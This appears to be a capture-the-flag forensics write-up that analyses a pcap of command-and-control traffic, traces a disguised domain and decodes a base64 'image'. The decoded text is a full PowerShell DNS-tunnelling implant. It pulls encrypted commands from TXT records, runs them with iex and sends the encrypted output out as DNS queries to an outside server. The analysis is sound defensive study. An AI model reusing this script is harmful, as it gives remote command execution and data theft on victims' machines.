This challenge is about extracting encoded information in a Wireshark pcap file,
where the scenario is that a host on the network has been infected with a command/control malware and has been sending suspicious network traffic.
We have been given a pcap which contains some of this type of malicious traffic.


<p align="center">
  <img src="https://i.imgur.com/OZm11OK.png" />
</p>

Checking in Analyze -> Export Information, there is a few items which are a little suspicious. Generally, Export Information tells us about stuff that's 'wrong' in the the pcap or otherwise out of the ordinary. Two items of note here, the DNS retransmission and a malformed HTTP png that the Wireshark dissector didn't manage to figure out what it actually was.

<p align="center">
  <img src="https://i.imgur.com/aozXol7.png" />
</p>

Investigating the malformed HTTP image first, we choose File -> Export Objects -> HTTP and check what the contents of the packet actually is...

<p align="center">
  <img src="https://i.imgur.com/xV4PK93.png" />
</p>

It appears the image is not an image at all, furthermore, the domain that the 'image' is being collected from appears to be a privately owned domain purchased via namecheap, attempting to obfuscate any forensics by pretending to be a Microsoft service...
```
whois windowsliveupdater.com
....
The Registry database contains ONLY .COM, .NET, .EDU domains and
Registrars.
Domain name: windowsliveupdater.com
Registry Domain ID: 2612912575_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.namecheap.com
Registrar URL: http://www.namecheap.com
Updated Date: 2022-05-10T15:59:18.29Z
Creation Date: 2021-05-17T18:42:28.00Z
Registrar Registration Expiration Date: 2023-05-17T18:42:28.00Z
Registrar: NAMECHEAP INC
Registrar IANA ID: 1068
Registrar Abuse Contact Email: abuse@namecheap.com
Registrar Abuse Contact Phone: +1.9854014545
Reseller: NAMECHEAP INC
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
```

Looking at the binary data of the image, it looks like base64, specifically because of the two equals signs at the end of the character stream.

```
ZnVuY3Rpb24gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QoJGtleSwgJElWKSB7CiAgICAkYWVzTWFuYWdlZCA9IE5ldy1PYmplY3QgIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzTWFuYWdlZCIKICAgICRhZXNNYW5hZ2VkLk1vZGUgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DaXBoZXJNb2RlXTo6Q0JDCiAgICAkYWVzTWFuYWdlZC5QYWRkaW5nID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpaZXJvcwogICAgJGFlc01hbmFnZWQuQmxvY2tTaXplID0gMTI4CiAgICAkYWVzTWFuYWdlZC5LZXlTaXplID0gMjU2CiAgICBpZiAoJElWKSB7CiAgICAgICAgaWYgKCRJVi5nZXRUeXBlKCkuTmFtZSAtZXEgIlN0cmluZyIpIHsKICAgICAgICAgICAgJGFlc01hbmFnZWQuSVYgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRJVikKICAgICAKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRhZXNNYW5hZ2VkLklWID0gJElWCiAgICAgCgogICAgICAgIH0KICAgIH0KICAgIGlmICgka2V5KSB7CgogICAgICAgIGlmICgka2V5LmdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIikgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRrZXkpCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSAka2V5CiAgICAgICAgfQogICAgfQogICAgJGFlc01hbmFnZWQKfQoKZnVuY3Rpb24gQ3JlYXRlLUFlc0tleSgpIHsKICAKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRhZXNNYW5hZ2VkLktleSkKfQoKZnVuY3Rpb24gRW5jcnlwdC1TdHJpbmcoJGtleSwgJHVuZW5jcnlwdGVkU3RyaW5nKSB7CiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1bmVuY3J5cHRlZFN0cmluZykKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleQogICAgJGVuY3J5cHRvciA9ICRhZXNNYW5hZ2VkLkNyZWF0ZUVuY3J5cHRvcigpCiAgICAkZW5jcnlwdGVkRGF0YSA9ICRlbmNyeXB0b3IuVHJhbnNmb3JtRmluYWxCbG9jaygkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpOwogICAgW2J5dGVbXV0gJGZ1bGxEYXRhID0gJGFlc01hbmFnZWQuSVYgKyAkZW5jcnlwdGVkRGF0YQogICAgJGFlc01hbmFnZWQuRGlzcG9zZSgpCiAgICBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRmdWxsRGF0YSkucmVwbGFjZSgiLSIsIiIpCn0KCmZ1bmN0aW9uIERlY3J5cHQtU3RyaW5nKCRrZXksICRlbmNyeXB0ZWRTdHJpbmdXaXRoSVYpIHsKICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGVuY3J5cHRlZFN0cmluZ1dpdGhJVikKICAgICRJViA9ICRieXRlc1swLi4xNV0KICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgICRkZWNyeXB0b3IgPSAkYWVzTWFuYWdlZC5DcmVhdGVEZWNyeXB0b3IoKTsKICAgICR1bmVuY3J5cHRlZERhdGEgPSAkZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJGJ5dGVzLCAxNiwgJGJ5dGVzLkxlbmd0aCAtIDE2KTsKICAgICRhZXNNYW5hZ2VkLkRpc3Bvc2UoKQogICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJHVuZW5jcnlwdGVkRGF0YSkuVHJpbShbY2hhcl0wKQp9CgpmaWx0ZXIgcGFydHMoJHF1ZXJ5KSB7ICR0ID0gJF87IDAuLlttYXRoXTo6Zmxvb3IoJHQubGVuZ3RoIC8gJHF1ZXJ5KSB8ICUgeyAkdC5zdWJzdHJpbmcoJHF1ZXJ5ICogJF8sIFttYXRoXTo6bWluKCRxdWVyeSwgJHQubGVuZ3RoIC0gJHF1ZXJ5ICogJF8pKSB9fSAKJGtleSA9ICJhMUU0TVV0eWNXc3dUbXRyTUhkcWRnPT0iCiRvdXQgPSBSZXNvbHZlLURuc05hbWUgLXR5cGUgVFhUIC1EbnNPbmx5IHdpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODl8U2VsZWN0LU9iamVjdCAtUHJvcGVydHkgU3RyaW5nczsKZm9yICgkbnVtID0gMCA7ICRudW0gLWxlICRvdXQuTGVuZ3RoLTI7ICRudW0rKyl7CiRlbmNyeXB0ZWRTdHJpbmcgPSAkb3V0WyRudW1dLlN0cmluZ3NbMF0KJGJhY2tUb1BsYWluVGV4dCA9IERlY3J5cHQtU3RyaW5nICRrZXkgJGVuY3J5cHRlZFN0cmluZwokb3V0cHV0ID0gaWV4ICRiYWNrVG9QbGFpblRleHQ7JHByID0gRW5jcnlwdC1TdHJpbmcgJGtleSAkb3V0cHV0fHBhcnRzIDMyClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5IHN0YXJ0LndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKZm9yICgkYW5zID0gMDsgJGFucyAtbHQgJHByLmxlbmd0aC0xOyAkYW5zKyspewokZG9tYWluID0gLWpvaW4oJHByWyRhbnNdLCIud2luZG93c2xpdmV1cGRhdGVyLmNvbSIpClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5ICRkb21haW4gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKICAgIH0KUmVzb2x2ZS1EbnNOYW1lIC10eXBlIEEgLURuc09ubHkgZW5kLndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKfQ==
```
 
Sure enough, decoding this as a base64 string yields the following powershell script.

```powershell
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
     
        }
        else {
            $aesManaged.IV = $IV
     

        }
    }
    if ($key) {

        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
  
    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-","")
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
for ($num = 0 ; $num -le $out.Length-2; $num++){
$encryptedString = $out[$num].Strings[0]
$backToPlainText = Decrypt-String $key $encryptedString
$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
$domain = -join($pr[$ans],".windowsliveupdater.com")
Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
    }
Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
}
```

